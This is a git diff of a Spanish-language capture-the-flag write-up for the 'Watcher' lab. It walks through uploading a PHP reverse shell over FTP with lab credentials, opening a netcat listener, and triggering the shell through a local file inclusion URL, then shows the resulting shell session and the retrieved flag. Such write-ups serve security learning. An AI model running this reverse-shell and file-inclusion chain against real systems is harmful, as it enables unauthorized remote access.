@@ -58,12 +58,43 @@ ftpuser:givemefiles777
 ![flag3](/assets/images/thm-writeup-watcher/watcher_flag3_1.png)
 2. Procedemos a subirla **rshell.php** al servidor **ftp** como lo muestra la siguiente imagen:
 ![flag3](/assets/images/thm-writeup-watcher/watcher_flag3.png)
-3. Nos ponemos en escucha por el puerto configurado, en nuestro caso **4444** con el siguiente comando: ~~~ nc -nlvp 4444 ~~~
-4. Ejecutamos la **rshell.php**, ejecutando la siguiente ruta http://watcher.local/post.php?post=/home/ftpuser/ftp/files/php-reverse-rshell.php, desde burpsuite o desde el navegador:
+3. Nos ponemos en escucha por el puerto configurado, en nuestro caso **4444** con el siguiente comando: **nc -nlvp 4444**
+4. Ejecutamos la **rshell.php**, ejecutando la siguiente ruta <http://watcher.local/post.php?post=/home/ftpuser/ftp/files/php-reverse-rshell.php>, desde burpsuite o desde el navegador:
 dd
 5. dddd
+![flag3](/assets/images/thm-writeup-watcher/watcher_flag3_2.png)
+
+
+~~~css
+└─# nc -nlvp 4444
+listening on [any] 4444 ...
+^Xconnect to [10.9.0.68] from (UNKNOWN) [10.10.69.106] 50632
+Linux watcher 4.15.0-128-generic #131-Ubuntu SMP Wed Dec 9 06:57:35 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
+ 03:33:19 up  2:52,  0 users,  load average: 0.00, 0.00, 0.00
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can't access tty; job control turned off
+$ ls
+/bin/sh: 1: ls: not found
+$ SHELL=/bin/bash script -q /dev/null
+www-data@watcher:/home$ ls
+ls
+ftpuser  mat  toby  will
+www-data@watcher:/home/mat$ find / -type f -name flag_3.txt 2>/dev/null
+find / -type f -name flag_3.txt 2>/dev/null
+/var/www/html/more_secrets_a9f10a/flag_3.txt
+www-data@watcher:/home/mat$ 
+www-data@watcher:/home/mat$ cd /var/www/html/more_secrets_a9f10a/flag_3.txt
+cd /var/www/html/more_secrets_a9f10a/flag_3.txt
+bash: cd: /var/www/html/more_secrets_a9f10a/flag_3.txt: Not a directory
+www-data@watcher:/home/mat$ cat /var/www/html/more_secrets_a9f10a/flag_3.txt
+cat /var/www/html/more_secrets_a9f10a/flag_3.txt
+FLAG{lfi_what_a_guy}
+www-data@watcher:/home/mat$                                       
+~~~
 
 ----
+
 
 ## 1. Fase de reconocimiento
 
